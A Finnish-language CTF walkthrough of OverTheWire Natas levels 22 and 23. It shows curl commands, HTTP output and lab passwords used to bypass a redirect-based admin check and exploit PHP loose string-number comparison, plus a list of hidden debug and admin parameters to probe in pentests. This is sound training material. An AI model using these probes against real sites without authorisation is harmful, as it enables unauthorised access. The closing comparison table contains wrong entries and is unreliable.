# natas 22 - START HERE;

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

![alt text](./kuvat-level22-28/natas22-0.png)


Ekana tyhjä sivu ja pelkä "view sourcecode".
Tässä tasossa voi koskien tuota PHP-session istuntoa jälleen kerran ja tarkistaa onko URL parametri `?revelio=..` mikäli paljastuu tai paljastaa sitten suoriuttuu jotenkin admin = 1 , josta saa käyttäjä saa sitten natas22 salasansa.


```
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

![alt text](./kuvat-level22-28/natas22-1.png)



Tässä ei mainittu **debug** sanaa, koska aikaisemmissa oli lisätty url perään `?debug` ja kokeillaan sijoittaa **revelio**. (Testattu: http://natas22.natas.labs.overthewire.org/?revelio=1) josta välähti pikaisesti ja palattin tähän natas22 etusivulle.

Ensimmäisessä kirjauduttu ainakin sen natas22 eävste PHPSESSID: 81tu6j4hevs6uffovnlm3o9vbf

```
┌──(kali㉿kali)-[~]
└─$ echo -n 81tu6j4hevs6uffovnlm3o9vbf | xxd -r -p
�                                                                                                                                                 
```

## Kali linxu tarkistusta 

```
┌──(kali㉿kali)-[~]
└─$ curl -v -Headers "Referer: http://natas22.natas.labs.overthewire.org/" http://natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz@natas22.natas.labs.overthewire.org
* URL rejected: Malformed input to a URL function
* Closing connection
curl: (3) URL rejected: Malformed input to a URL function
* Host natas22.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.50.19.111
*   Trying 13.50.19.111:80...
* Connected to natas22.natas.labs.overthewire.org (13.50.19.111) port 80
* Server auth using Basic with user 'natas22'
> GET / HTTP/1.1
> Host: natas22.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Fri, 18 Jul 2025 12:10:36 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Set-Cookie: PHPSESSID=j2rnpfveneqfttdbv2jl7o45f2; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 896
< Content-Type: text/html; charset=UTF-8
< 


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas22.natas.labs.overthewire.org left intact

┌──(kali㉿kali)-[~]
└─$ curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz --referer http://natas23.natas.labs.overthewire.org/ http://natas22.natas.labs.overthewire.org


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


MItä tämä tosiaan tekekään: `curl -i --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"` <br>
- `-i` näyttää http hederit
- `--user` kirjauduttaan sisään millä tunnuksella <username:password> sitten "http-url" ja `/?revelio=1`

```
┌──(kali㉿kali)-[~]
└─$ curl -i --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"
HTTP/1.1 302 Found
Date: Fri, 18 Jul 2025 12:32:54 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=mnv6949mir0vverielcbtbt54l; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**Miksi tämä toimii näin?**
- vaikka siinä php koodissa on mainittu lähettää `location: /` headeriä, mutta se ei lopeta skriptiä. 
- curl komennossa ei seuraa uudelleen ohjausta automaattisesti, niin se näyttää koko vastauksen ja mukaan lukien salasanansa.
- Pieni pohdintana olisiko pitänyt tietää tämä vastaus kuitenkin että sijoittaa ton parametrin perään vaan ja sitten mukaan curl -i natas 22 käyttäjä.



tässä komennossa tapahtuu `-L` seuraa redirectejä ja `--max-redirs 0` tarkoittaa estää redirectin seuraamisen:
- `curl -i -L --max-redirs 0 --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"`

```
┌──(kali㉿kali)-[~]
└─$ curl -i -L --max-redirs 0 --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"
HTTP/1.1 302 Found
Date: Fri, 18 Jul 2025 12:51:00 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=31d2602ulvfpmhrc177img5on8; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Content-Type: text/html; charset=UTF-8

curl: (47) Maximum (0) redirects followed
```
                                                                                                                                                  
---

## curl komentoja CTF ja pentest tilassa
lisä lunttilappun tarkistus listaan

Tämä on malli pohja: 
- `curl -i --user natas22:<salasana> "http://natas22.natas.labs.overthewire.org/?debug=1"`

Jos sivustolla ois tai koodin pätkässä `debug` parametri sana, niin se saattaa aktivoida lisäinformaation tai virheilmoitusta. `curl -i` näyttää ne suoraan, vaikka selain ei niitä näyttäisikään.

Muutama curl taktinen CTF- ja pentest tilanteissa ja tämä on normi testausta web-sovelluksien kanssa on hyvä myös kokeilla:

- `curl -i` tai `curl -v` nähdäkseen kaiken

sitten parametreja eli url perässä:
- `?debug=1`
- `?admin=1`
- `?reveal=true`
- `?source=1`
- `?test=1`
- `?show=all`

Sekä nämä voivat paljastaa kehittäjien jättämiä takaporttej tai testikoodeja.


## 🧭 Polku PHP-koodissa (Natas-harjoitukset)

Tässä muistiinpano koskee view source -välilehden (index-source.html) PHP-koodia Natas-tasoissa. Niissä koodi sisältää erityisiä URL-parametreja, jotka eivät näy sivulla normaalisti, mutta ne kytkevät salaisen toiminnon päälle. Niitä voi käyttää vain tietyissä tilanteissa, ja niihin liittyy istunto (session) tai eväste.

### 🔐 Esimerkki Natas22: revelio

```
if(array_key_exists("revelio", $_GET)) {
  if(!($_SESSION and $_SESSION["admin"] == 1)) {
    header("Location: /");
  }
}
```

→ Tässä parametri `revelio` toimii salaisuutena, mutta sen käyttö vaatii, että istunnossa on admin-oikeudet (`$_SESSION["admin"] == 1`). Muuten selain ohjataan takaisin alkuun. Eli pelkkä URL-parametri ei riitä — pitää myös huijata sessiota.


### 🧪 Esimerkki Natas20: debug

```
if(array_key_exists("debug", $_GET)) {
  print "DEBUG: $msg<br>";
}
```

→ Parametri `debug` ei paljasta salasanaa suoraan, mutta näyttää lisätietoja, kuten mitä istunnon sisällä tapahtuu, ja miten session-tiedosto rakentuu. Tämä voi auttaa ratkaisemaan tehtävää.


## ❓ Miksi kysymysmerkki (?) pitää olla URL:ssa ennen parametreja?

Koska se aloittaa query stringin eli GET-pyynnön parametrit. Esimerkiksi: `http://natas22.natas.labs.overthewire.org/index.php?revelio`


Ilman kysymysmerkkiä selain ei lähetä parametreja ollenkaan, eikä PHP:n `$_GET`-taulukossa ole mitään.


## 🧠 Yhteenveto

- Parametrit kuten revelio ja debug toimivat salaisina kytkiminä.
- Ne pitää lisätä URL:iin kysymysmerkin jälkeen.
- Oikeanlaisen tuloksen saaminen voi vaatia istunnon muokkausta (admin=1) tai debug-tulosteiden analysointia.
- Molemmat tasot perustuvat samaan ideaan: piilotetut URL-parametrit aktivoivat toiminnon, jota ei normaalisti näe.


---

# natas 23 - START HERE;

Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs


Tuossa jo aikaisempikin n. 20 level alkaen tarkistamatta etusivun HTML koodia, ja hypättiin välittömästi asiansa ja jos on view-source koodi sivusto.

![alt text](./kuvat-level22-28/natas22-0.png)

Tässä tällä kertaa syötetään kenttään koodi lomakkeeseen niin varmasti antaa natas24 salasansa. Seuraavassa **index-source.html** . Lomakekentään siis syötä koodi koko (pituus) 20 sanaa, ja sitten tekee sen if-else funktionsa jos täsmentyy niin antaa natas24 vastauksensa ja jos ei sitten ei täsmää. Eli jos syöttää salasan formaattiin "iloveyou" tai "passwd" tai joka on alle 10 sanaa - niin se on väärin. Todellinen vastaus voi olla pitää syöttää kenttään yli 10 ja alle 20 sanan väliltä.

```
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

![alt text](./kuvat-level22-28/natas23-1.png)



Pari / muutamien testauksen jälkeen just "iloveyou", "passwd" , "administrator" ja jne, se toisti siihen URL perään parametriä näin: http://natas23.natas.labs.overthewire.org/?passwd=administrator 

Vastaus ei ole administrator.


## Kali linux komentoa

Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs


```
┌──(kali㉿kali)-[~]
└─$ curl -i --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/"
HTTP/1.1 200 OK
Date: Mon, 21 Jul 2025 11:14:57 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1036
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


┌──(kali㉿kali)-[~]
└─$ curl -i -L --max-redirs 0 --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/"
HTTP/1.1 200 OK
Date: Mon, 21 Jul 2025 11:15:45 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1036
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


┌──(kali㉿kali)-[~]
└─$ curl -i -v --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/"
* Host natas23.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.50.19.111
*   Trying 13.50.19.111:80...
* Connected to natas23.natas.labs.overthewire.org (13.50.19.111) port 80
* Server auth using Basic with user 'natas23'
> GET / HTTP/1.1
> Host: natas23.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMzpkSVVRY0kzdVN1czFKRU9TU1dSQUVYQkc4S2JSOHRScw==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Mon, 21 Jul 2025 11:16:40 GMT
Date: Mon, 21 Jul 2025 11:16:40 GMT
< Server: Apache/2.4.58 (Ubuntu)
Server: Apache/2.4.58 (Ubuntu)
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Length: 1036
Content-Length: 1036
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< 

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas23.natas.labs.overthewire.org left intact
```

## vastaus:

Tässä tason harjoituksessa ideana oli lukea sitä index-source.html välilehteä, koska siinä PHP koodi pätkässä oli pieni vastaus - ja olisi pitänyt arvattakin.

Tässä funktiossa osassa: `if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))` - tämä on se vastaus, jossa lomake hyväksyy salasansa, **jos syötettään merkkijonoa "iloveyou"**, ja samalla se on arvoa suurempi kuin 10. Ehkä tässä on yksityiskohta, kun verrataan merkijonoa suuruusvertailuna luku on 10.

Testasin normaalisti sen "iloveyou", että "passwd" mutta vinkkien mukaan se onkin vastauksena: **"11iloveyou"**. Ehkä outoimmista on se mistä ja miten se on tullut toi numero "11" siihen ja + "iloveyou"?.


**The credentials for the next level are:
Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd**



Tämä on sama vastaus mutta testasin url perään toi osuus, mutta on toista tapaakin.

```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou" --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Tämä se toinen taikatemppu, joka voi simulida käyttäjän syöte lomakekenttää. Just tämän kenttän tyyppiä `<input type="text" name="passwd">` , kuten tässä harjoituksen-tasossa. 

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://natas23.natas.labs.overthewire.org/ \
     -d "passwd=11iloveyou" \
     --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

![alt text](./kuvat-level22-28/natas23-2.png)


## pieni teoria

Ongelmana, että miksi php koodissa yhdessä rivissä on näin `if(strstr($_REQUEST["passwd"], "iloveyou") && ($_REQUEST["passwd"] > 10))` - ja harjoituksena tässä mukaan on **weak password** - eli heikko salasana.


Tässä yksi outoina on se miksi alkuun tulee "11" ja sitten "iloveyou" -merkkijono, ja silti toimisikaan normaalisti jos menisi "iloveyou11".


PHP:n tyyppimuunnoslogiikka on tässä se "peculiarity" eli erikoisuus, johon tehtävän ratkaisu perustuu:

- 🔤 `strstr($_REQUEST["passwd"], "iloveyou")` → vaatii, että merkkijonossa esiintyy sana "iloveyou"
- 🔢 `$_REQUEST["passwd"] > 10` → vaikka `passwd` on merkkijono, PHP muuntaa sen automaattisesti numeroksi, jos se alkaa numerolla

Tässä tapauksessa "11iloveyou" tulkittuna numeroksi 11, koska PHP lukee merkkijonon alusta numerot ja jättää lopun pois tyyppimuunnoksensa. Voi olla koska 11 on suurempi kuin 10 (11 > 10) ja "iloveyou" mukana, molemmat ehdot täyttyvät.

PHP yrittää vertailla merkkijonoa lukuarvoon. Jos merkkijono alkaa numerolla, PHP tulkitsee sen automaattisesti numeroksi. → "11iloveyou" alkaa numerolla → PHP muuntaa sen luvuksi 11 on suurempi kuin 10.

PHP koodissa voi tarkoittaa näin:
- Jos merkkijono alkaa numerolla, PHP muuntaa sen numeroksi vertailun ajaksi
- Toisena jos merkkijono ei ala numerolla, PHP tulkitsee sen numeroks 0


Salasana-parametrissa numero pitää olla alussa, jotta PHP tulkitsee sen vertailussa numeroksi. Vasta silloin ehto > 10 voi toteutua. Esimerkiksi 11iloveyou toimii, koska "iloveyou" sisältyy arvoon ja alkuosa 11 täyttää vertailuehdon. Harjoituksen ydinidea liittyy **heikkoon salasanatarkistukseen**: vihje ei suoraan kertonut missä kohtaa "iloveyou" pitää olla tai että vertailu tehdään numerona. Testatessa toimii arvot kuten 11iloveyou, 3459iloveyou, ja muut numerot, jotka ovat suurempia kuin 10 — kunhan ne alkavat numerolla ja sisältävät sanan "iloveyou".


Tämä taulukko havainnollistaa, miten PHP käsittelee `$_REQUEST["passwd"] > 10` -vertailua merkkijonojen kanssa, ja miksi jotkut syötteet toimivat ja toiset eivät.

| Syöte (`passwd`)   | Sisältää "iloveyou"? | Alkaako numerolla? | PHP tulkinta numerona | > 10 täyttyy? |
|--------------------|-----------------------|----------------------|------------------------|----------------|
| `11iloveyou`       | ✅                    | ✅                   | `11`                   | ✅             |
| `iloveyou11`       | ✅                    | ❌                   | `0`                    | ❌             |
| `5iloveyou`        | ✅                    | ✅                   | `5`                    | ❌             |
| `99iloveyou`       | ✅                    | ✅                   | `99`                   | ✅             |
| `iloveyou`         | ✅                    | ❌                   | `0`                    | ❌             |
| `love11iloyou`     | ❌                    | ✅                   | `11`                   | ✅             |



